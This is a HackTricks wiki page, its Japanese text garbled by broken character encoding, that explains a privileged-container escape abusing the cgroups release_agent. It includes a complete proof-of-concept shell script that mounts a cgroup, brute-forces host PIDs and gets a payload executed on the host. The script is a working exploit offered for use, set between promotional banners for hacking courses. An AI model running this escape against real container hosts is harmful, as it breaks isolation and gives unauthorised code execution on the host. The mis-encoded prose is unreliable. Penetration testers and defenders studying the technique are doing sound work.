{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

ã•ã‚‰ãªã‚‹è©³ç´°ã¯ã€**[https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)**ã®ãƒ–ãƒ­ã‚°ãƒãƒ¼ãƒˆã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯è¦ç´„ã«éãã¾ã›ã‚“ï¼š

ã“ã®æŠ€è¡“ã¯ã€**ã‚³ãƒ³ãƒ†ãƒŠå†…ã‹ã‚‰ãƒ›ã‚¹ãƒˆã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•**ã‚’æ¦‚èª¬ã—ã¦ãŠã‚Šã€Kata Containersã‚„ç‰¹å®šã®`devicemapper`è¨­å®šã®ã‚ˆã†ã«ã€ãƒ›ã‚¹ãƒˆä¸Šã®ã‚³ãƒ³ãƒ†ãƒŠã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ‘ã‚¹ã‚’éš ã™ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ãƒ‰ãƒ©ã‚¤ãƒè¨­å®šã«ã‚ˆã£ã¦å¼•ãèµ·ã“ã•ã‚Œã‚‹èª²é¡Œã‚’å…‹æœã—ã¾ã™ã€‚

ä¸»ãªã‚¹ãƒ†ãƒƒãƒ—ï¼š

1. **ãƒ—ãƒ­ã‚»ã‚¹IDï¼ˆPIDï¼‰ã®ç‰¹å®šï¼š** Linuxã®æ“¬ä¼¼ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ å†…ã®`/proc/<pid>/root`ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã‚’ä½¿ç”¨ã—ã¦ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã®ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒ›ã‚¹ãƒˆã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã«å¯¾ã—ã¦ç›¸å¯¾çš„ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ›ã‚¹ãƒˆä¸Šã®ã‚³ãƒ³ãƒ†ãƒŠã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ‘ã‚¹ã‚’çŸ¥ã‚‹å¿…è¦ãŒãªããªã‚Šã¾ã™ã€‚
2. **PIDãƒãƒƒã‚·ãƒ³ã‚°ï¼š** ãƒ›ã‚¹ãƒˆä¸Šã®PIDã‚’æ¤œç´¢ã™ã‚‹ãŸã‚ã«ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã‚¢ãƒ—ãƒ­ãƒ¼ãƒãŒæ¡ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€`/proc/<pid>/root/<file>`ã«ç‰¹å®šã®ãƒ•ã‚¡ã‚¤ãƒ«ã®å­˜åœ¨ã‚’é †æ¬¡ç¢ºèªã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ãŒè¦‹ã¤ã‹ã‚‹ã¨ã€ãã‚Œã¯å¯¾å¿œã™ã‚‹PIDãŒã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚³ãƒ³ãƒ†ãƒŠå†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã«å±ã—ã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã—ã¾ã™ã€‚
3. **å®Ÿè¡Œã®ãƒˆãƒªã‚¬ãƒ¼ï¼š** æ¨æ¸¬ã•ã‚ŒãŸPIDãƒ‘ã‚¹ãŒ`cgroups release_agent`ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã¾ã‚Œã¾ã™ã€‚ã“ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯`release_agent`ã®å®Ÿè¡Œã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ã€‚ã“ã®ã‚¹ãƒ†ãƒƒãƒ—ã®æˆåŠŸã¯ã€å‡ºåŠ›ãƒ•ã‚¡ã‚¤ãƒ«ã®ä½œæˆã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§ç¢ºèªã•ã‚Œã¾ã™ã€‚

### æ”»æ’ƒãƒ—ãƒ­ã‚»ã‚¹

æ”»æ’ƒãƒ—ãƒ­ã‚»ã‚¹ã¯ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã®æ­£ã—ã„PIDã‚’æ¨æ¸¬ã—ã¦ãƒ›ã‚¹ãƒˆä¸Šã§ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚’ç›®çš„ã¨ã—ãŸã€ã‚ˆã‚Šè©³ç´°ãªä¸€é€£ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å«ã¿ã¾ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ã«å±•é–‹ã•ã‚Œã¾ã™ï¼š

1. **ç’°å¢ƒã®åˆæœŸåŒ–ï¼š** ãƒ›ã‚¹ãƒˆä¸Šã«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆï¼ˆ`payload.sh`ï¼‰ãŒæº–å‚™ã•ã‚Œã€cgroupæ“ä½œã®ãŸã‚ã®ãƒ¦ãƒ‹ãƒ¼ã‚¯ãªãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒä½œæˆã•ã‚Œã¾ã™ã€‚
2. **ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®æº–å‚™ï¼š** ãƒ›ã‚¹ãƒˆä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒãƒ³ãƒ‰ã‚’å«ã‚€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒä½œæˆã•ã‚Œã€å®Ÿè¡Œå¯èƒ½ã«ã•ã‚Œã¾ã™ã€‚
3. **Cgroupã®è¨­å®šï¼š** cgroupãŒãƒã‚¦ãƒ³ãƒˆã•ã‚Œã€è¨­å®šã•ã‚Œã¾ã™ã€‚`notify_on_release`ãƒ•ãƒ©ã‚°ãŒè¨­å®šã•ã‚Œã€cgroupãŒè§£æ”¾ã•ã‚Œã‚‹ã¨ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
4. **PIDã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ï¼š** ãƒ«ãƒ¼ãƒ—ãŒæ½œåœ¨çš„ãªPIDã‚’åå¾©ã—ã€å„æ¨æ¸¬ã•ã‚ŒãŸPIDã‚’`release_agent`ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã¿ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒ`release_agent`ã¨ã—ã¦è¨­å®šã•ã‚Œã¾ã™ã€‚
5. **å®Ÿè¡Œã®ãƒˆãƒªã‚¬ãƒ¼ã¨ç¢ºèªï¼š** å„PIDã«ã¤ã„ã¦ã€cgroupã®`cgroup.procs`ã«æ›¸ãè¾¼ã¾ã‚Œã€PIDãŒæ­£ã—ã„å ´åˆã«`release_agent`ã®å®Ÿè¡ŒãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã¾ã™ã€‚ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å‡ºåŠ›ãŒè¦‹ã¤ã‹ã‚‹ã¾ã§ãƒ«ãƒ¼ãƒ—ã¯ç¶šãã€æˆåŠŸã—ãŸå®Ÿè¡Œã‚’ç¤ºã—ã¾ã™ã€‚

ãƒ–ãƒ­ã‚°æŠ•ç¨¿ã‹ã‚‰ã®PoC:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
</details>
{% endhint %}
